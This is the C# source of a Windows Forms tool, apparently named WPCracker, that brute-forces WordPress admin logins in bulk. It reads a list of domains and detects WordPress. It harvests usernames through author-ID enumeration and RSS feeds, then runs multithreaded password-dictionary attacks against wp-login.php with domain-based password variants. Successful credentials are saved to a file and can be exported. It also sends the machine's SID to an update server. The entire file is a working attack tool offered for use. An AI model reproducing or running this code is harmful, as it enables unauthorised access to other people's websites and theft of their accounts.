using System;
using System.Collections.Generic;
using System.Windows.Forms;
using WPCraker.Tools;
using System.Threading;
using WPCreaker.Tools;
using System.Collections;
using System.Text.RegularExpressions;
using System.IO;
using Amib.Threading;
using System.Web;
using System.Net;
using SuperSQLInjection.tools;

namespace WPCraker
{
    public partial class WPCreaker : Form
    {
        public WPCreaker()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
            System.Net.ServicePointManager.DefaultConnectionLimit = 1000;
        }
        public List<String> urls_list = new List<String>();
        public Hashtable sucess_list = new Hashtable();
        public int maxThread = 20;
        public int timeout = 20;
        public long success = 0;
        public long taskCount = 0;
        public long creakCount = 0;
        public List<Thread> list_th = new List<Thread>();
        public int useedTime = 0;
        public Thread th;
        public Hashtable creaker_table = new Hashtable();

        public void initData()
        {
            sucess_list.Clear();
            success = 0;
            taskCount = 0;
            creakCount = 0;
            list_th.Clear();
            useedTime = 0;
            creaker_table.Clear();
            lvw_result.Items.Clear();
        }

        public List<String> pass_list = new List<String>();

        public void initPassDic()
        {

            this.pass_list = FileTool.readFileToList(AppDomain.CurrentDomain.BaseDirectory+"/dic/pass.txt");
        }

        private void btn_import_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog { Filter = "文本文件(*.txt)|*.txt" };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                urls_list = FileTool.readFileDomainsToList(ofd.FileName);

                this.lbl_domainCount.Text = urls_list.Count + "";
            }
        }

        public void stopThread()
        {
            this.txt_log.Invoke(new changeLog(updateLog), "破解线程完成，正在等待所有线程结束，请稍候.....");
            stp.Shutdown();
            while (stp.InUseThreads>0)
            {
                Thread.Sleep(10);
            }
            updateInfo();
            this.txt_log.Invoke(new changeLog(updateLog), "所有破解线程已结束，破解任务完成！");
            this.timer1.Enabled = false;
            this.useedTime = 0;
            this.success = 0;
            this.creakCount = 0;
            this.btn_start.Enabled = true;
            this.status = 0;
            this.btn_stop.Enabled = true;
        }

        public void cracker(String domain,String user,String pass)
        {
            //跳过某些已经成功登陆了的。
            if (sucess_list.Contains(domain + "----" + user)){
                return;
            }
            //处理变化的密码
            pass = pass.Replace("%domain%", domain.Replace("http://", "").Replace("www.", ""));
            String reg = "\\.\\w+\\.";
            if (domain.LastIndexOf('.') == domain.IndexOf('.'))
            {
                reg = "\\w+\\.";
            }
            Match m = Regex.Match(domain, reg);
            if (m.Success)
            {
                pass = pass.Replace("%domain_center%", m.Groups[0].Value.Replace(".", ""));
            }

            pass = pass.Replace("%user%", user);

            String location = HttpTool.getLocationByPost(domain + "/wp-login.php", "log=" + HttpUtility.UrlEncode(user)+ "&pwd=" + HttpUtility.UrlEncode(pass) + "&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=" + domain + "%2Fwp-admin%2F&testcookie=1", timeout);

            if (location.IndexOf("wp-admin") != -1)
            {
                
                if (!sucess_list.Contains(domain + "----" + user)) {
                    String successStr = domain + ":破解成功！账户：" + user + "----密码：" + pass;
                    this.txt_log.Invoke(new changeLog(updateLog), successStr);
                    FileTool.AppendLogToFile("/sucess.txt", successStr);
                    Interlocked.Increment(ref success);
                    this.lvw_result.Invoke(new delegateUpdateList(updateList), domain, user, pass);
                    sucess_list.Add(domain + "----" + user,pass);
                }
                
               
            }
            Interlocked.Increment(ref creakCount);

        }

        delegate void delegateUpdateList(String domain, String user, String pass);

        public void updateList(String domain,String user,String pass)
        {
            ListViewItem lvi = new ListViewItem(success + "");
            lvi.SubItems.Add(domain);
            lvi.SubItems.Add(user);
            lvi.SubItems.Add(pass);
            this.lvw_result.Items.Add(lvi);
        }

        delegate void changeLog(String log);


        public void updateLog(String log)
        {
            this.txt_log.AppendText(log +"\r\n");
        }
        SmartThreadPool stp = new SmartThreadPool();

        public void getUserNames(String domain,int timeout) {

            //获得用户名
            if (!creaker_table.ContainsKey(domain))
            {
                if (domain.ToString().EndsWith("/"))
                {
                    domain = domain.ToString().Substring(0, domain.ToString().Length - 1);
                }

                HttpResult th = HttpTool.getHttpResult(domain + "/wp-login.php", timeout,false);
                if (!"".Equals(th.location)) {
                    if (th.location.StartsWith("https")) {
                        String ndomain= domain.Replace("http://", "https://");

                        this.txt_log.Invoke(new changeLog(updateLog), domain + "判断需要为https访问，已经自动修正为："+ ndomain);
                        domain = ndomain;
                    }
                    th = HttpTool.getHttpResult(domain + "/wp-login.php", timeout, false);
                }
                
                if (!"".Equals(th.html) && (th.html.IndexOf("wp-login.php?action=lostpassword") != -1 || th.html.IndexOf("/wp-includes/") != -1 || th.html.IndexOf("/wp-content/") != -1))
                {
                    //获取用户名
                    this.txt_log.Invoke(new changeLog(updateLog), domain + "判断为wordpress，正在自动收集用户名.....");
                    List<String> user_list = new List<String>();

                    int i = 1;
                    int errorCount = 0;
                    while (user_list.Count <= 10&& errorCount<3)
                    {
                        String url = domain + "/?author=" + i;
                        HttpResult hr = new HttpResult();
                        hr = HttpTool.getHttpResult(url, timeout, false);
                        String gusername = Tool.getUserName(hr);
                        if (!String.IsNullOrEmpty(gusername) && !user_list.Contains(gusername))
                        {
                            user_list.Add(gusername);
                        }
                        else
                        {
                            break;
                        }
                        i++;
                    }
                    if (user_list.Count <= 0)
                    {
                        String feedurl = domain + "/?feed=rss2";
                        HttpResult fhr = HttpTool.getHttpResult(feedurl, timeout, true);
                        List<String> list = Tool.getUserNameByFeed(fhr.html);
                        if (list.Count > 0)
                        {
                            user_list = list;
                            this.txt_log.Invoke(new changeLog(updateLog), domain + "自动获取到用户名：" + String.Join(",", user_list));
                        }
                    }
                    else
                    {
                        this.txt_log.Invoke(new changeLog(updateLog), domain + "自动获取到用户名：" + String.Join(",", user_list));
                    }
                    //没有获取到用户名，使用默认用户名
                    if (user_list.Count <= 0)
                    {
                        this.txt_log.Invoke(new changeLog(updateLog), domain + "没有获取到用户名,使用默认用户名字典！");
                        user_list = FileTool.readFileToList(AppDomain.CurrentDomain.BaseDirectory + "/dic/user.txt");
                        FileTool.AppendLogToFile("/logs/" + DateTime.Now.ToLongDateString() + ".wordpress.txt", domain + "----使用默认账号字典");
                    }
                    else
                    {
                        FileTool.AppendLogToFile("/logs/" + DateTime.Now.ToLongDateString() + ".wordpress.txt", domain + "----" + String.Join(",", user_list));
                    }
                    if (!creaker_table.ContainsKey(domain))
                    {
                        creaker_table.Add(domain, user_list);
                    }
                }
                else {
                    this.txt_log.Invoke(new changeLog(updateLog), "判断" + domain + "非wordpress，跳过....");
                    return;
                }
                
            }
            Interlocked.Increment(ref creakCount);
        }
        public void crackerpass()
        {
            stp.MaxThreads = maxThread;
            stp.Start();
            int timeout = int.Parse(this.cmb_timeout.Text);
            taskCount += urls_list.Count;
            foreach (String domain in urls_list)
            {
                try
                {

                    String ndomain = Tool.updateTheDomain(domain);
                    //现获取用户名
                    stp.QueueWorkItem<String,int>(getUserNames, ndomain, timeout);
                    stp.WaitFor(1000);
 
                }
                catch (Exception e)
                {
                    Tool.SysLog("执行线程异常！" + domain + e.Message);
                    continue;
                }
            }
            stp.WaitForIdle();
            //stp.Start();
            this.txt_log.Invoke(new changeLog(updateLog), "获取用户名完成，正在开始尝试破解，请稍候.....");
            
            foreach (List<String> list in creaker_table.Values)
            {
                taskCount += pass_list.Count * list.Count;
            }

            foreach (String pass in this.pass_list)
            {
                IDictionaryEnumerator ide = null;
                lock (creaker_table)
                {
                   ide = creaker_table.GetEnumerator();
                }
                
                while (ide.MoveNext())
                {
                    String ndomain = Tool.updateTheDomain(ide.Key.ToString());
                    List<String> userlist = (List<String>)ide.Value;
                    if (userlist != null && userlist.Count > 0)
                    {

                        foreach (String user in userlist)
                        {
                            try
                            {
                                stp.QueueWorkItem<String, String, String>(cracker, ndomain, user, pass);
                                stp.WaitFor(1000);

                            }
                            catch (Exception e)
                            {
                                Tool.SysLog("执行线程异常！" + ndomain + e.Message);
                                continue;
                            }
                        }
                    }
                }
                this.txt_log.Invoke(new changeLog(updateLog), "正在尝试密码队列："+pass);
            }
            stp.WaitForIdle();
            stopThread();
            MessageBox.Show("破解完成！");
        }

        private void btn_export_Click(object sender, EventArgs e)
        {
            if (sucess_list.Count == 0)
            {
                MessageBox.Show("抱歉，没有数据！");
                return;
            }
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "文本文件|*.txt";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                FileStream fs = new FileStream(sfd.FileName, FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter sw = new StreamWriter(fs);
                foreach (DictionaryEntry de in sucess_list)
                {
                    sw.WriteLine(de.Key+"----"+de.Value);
                }
                sw.Close();
                fs.Close();
                MessageBox.Show("导出成功！");
            }
        }




        public int status = 0;
        private void btn_start_Click(object sender, EventArgs e)
        {
            if (status == 0)
            {
                initData();
                if (this.urls_list.Count <= 0)
                {
                    MessageBox.Show("请导入Wordpress域名！");
                    return;
                }
                initPassDic();
                if (this.pass_list.Count <= 0)
                {
                    MessageBox.Show("请设置密码字典！");
                    return;
                }
                this.maxThread = int.Parse(this.cmb_threadCount.Text);
                th = new Thread(crackerpass);
                this.btn_start.Enabled = false;
                this.timer1.Enabled = true;
                th.Start();
                this.btn_start.Enabled = false;
                this.status = 1;
            }
            
        }

        public void updateInfo()
        {
            this.lbl_taskStatus.Text = creakCount + "/"+taskCount;
            this.lbl_threadStatus.Text = stp.InUseThreads + "/"+ stp.MaxThreads;
            this.lbl_crackerSuccessCount.Text = sucess_list.Count + "";
            this.lbl_useTime.Text = useedTime + "";
            int c = 0;
            if (this.taskCount != 0)
            {
                c = (int)Math.Floor((creakCount * 100 / (double)this.taskCount));
            }
            if (c <= 0)
            {
                c = 0;
            }
            if (c >= 100)
            {
                c = 100;
            }
            this.prb_status.Value = c;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            useedTime++;
            updateInfo();

        }

        private void WPCreaker_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }

        private void WPCreaker_Shown(object sender, EventArgs e)
        {
            this.cmb_threadCount.SelectedIndex = 19;
            this.cmb_timeout.SelectedIndex = 3;
            Thread t = new Thread(checkUpdate);
            t.Start();
        }


        public static int version = 20190509;
        public static string versionURL = "http://www.shack2.org/soft/getNewVersion?ENNAME=WPCracker&NO=" + URLEncode.UrlEncode(Tool.getSystemSid()) + "&VERSION=" + version;
        //检查更新
        public void checkUpdate()
        {
            try
            {
                String[] result = HttpTool.getHtml(versionURL, 30).Split('-');
                String versionText = result[0];
                int cversion = int.Parse(result[1]);
                String versionUpdateURL = result[2];
                if (cversion > version)
                {
                    DialogResult dr = MessageBox.Show("发现新版本：" + versionText + "，更新日期：" + cversion + "，立即更新吗？", "提示", MessageBoxButtons.OKCancel);

                    if (DialogResult.OK.Equals(dr))
                    {
                        try
                        {
                            int index = versionUpdateURL.LastIndexOf("/");
                            String filename = "update.rar";
                            if (index != -1)
                            {
                                filename = versionUpdateURL.Substring(index);
                            }
                            HttpDownloadFile(versionUpdateURL, AppDomain.CurrentDomain.BaseDirectory + filename);
                            MessageBox.Show("更新成功，请将压缩包解压后运行！");
                        }

                        catch (Exception other)
                        {
                            MessageBox.Show("更新失败，请访问官网更新！" + other.GetBaseException());
                        }
                    }
                }
                else
                {
                    this.txt_log.Invoke(new changeLog(updateLog), "自动检查更新，没有发现新版本！");
                }
            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new changeLog(updateLog), "无法连接更新服务器！");
            }
        }

        public void HttpDownloadFile(string url, string path)
        {
            // 设置参数
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;

            //发送请求并获取相应回应数据
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
            //直到request.GetResponse()程序才开始向目标网页发送Post请求
            Stream responseStream = response.GetResponseStream();
            long sum = response.ContentLength;
            //创建本地文件写入流
            Stream stream = new FileStream(path, FileMode.Create);

            byte[] bArr = new byte[1024];
            int size = responseStream.Read(bArr, 0, (int)bArr.Length);
            int csum = 0;
            csum += size;
            while (size > 0)
            {
                stream.Write(bArr, 0, size);
                size = responseStream.Read(bArr, 0, (int)bArr.Length);
                csum += size;
                int val = (int)(csum * 100 / sum);
                this.lbl_info.Text = "下载更新文件：" + val + "%";
            }
            this.lbl_info.Text = "下载更新文件完成！";
            stream.Close();
            responseStream.Close();
        }

        private void 打开URLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lvw_result.SelectedItems.Count == 0)
            {
                return;
            }
            string target = this.lvw_result.SelectedItems[0].SubItems[1].Text;

            try
            {

                System.Diagnostics.Process.Start("IEXPLORE.EXE", target);

            }
            catch (Exception oe)
            {
                MessageBox.Show("无法打开IE---" + oe.Message);
            }
        }

        private void btn_stop_Click(object sender, EventArgs e)
        {
            Thread th = new Thread(stopThread);
            th.Start();
            this.btn_stop.Enabled = false;
        }
        public void changeThreadSize() {
            stp.MaxThreads = this.maxThread;
            this.cmb_threadCount.Enabled = true;
        }
        private void cmb_threadCount_TextChanged(object sender, EventArgs e)
        {
            this.maxThread = int.Parse(this.cmb_threadCount.Text);
            Thread t = new Thread(changeThreadSize);
            this.cmb_threadCount.Enabled = false;
            t.Start();
        }

        private void btn_import_passdic_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog { Filter = "文本文件(*.txt)|*.txt" };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                pass_list = FileTool.readFileToList(ofd.FileName);
                this.txt_log.Invoke(new changeLog(updateLog), "选择密码字典成功，读取到"+ pass_list.Count+"个密码！");
            }
        }

        private void chk_useDefaultPassDic_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chk_useDefaultPassDic.Checked)
            {
                this.btn_import_passdic.Enabled = false;
                if (this.pass_list.Count > 0) {
                    this.pass_list.Clear();
                }
                
            }
            else {
                this.btn_import_passdic.Enabled = true;
            }
        }

        private void 复制ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lvw_result.SelectedItems.Count == 0)
            {
                return;
            }
            Clipboard.SetText(this.lvw_result.SelectedItems[0].SubItems[1].Text + "----" + this.lvw_result.SelectedItems[0].SubItems[2].Text+"----"+ this.lvw_result.SelectedItems[0].SubItems[3].Text);
            MessageBox.Show("复制成功！");
        }

        private void cmb_timeout_TextChanged(object sender, EventArgs e)
        {
            this.timeout = int.Parse(this.cmb_timeout.Text);
        }
    }
}
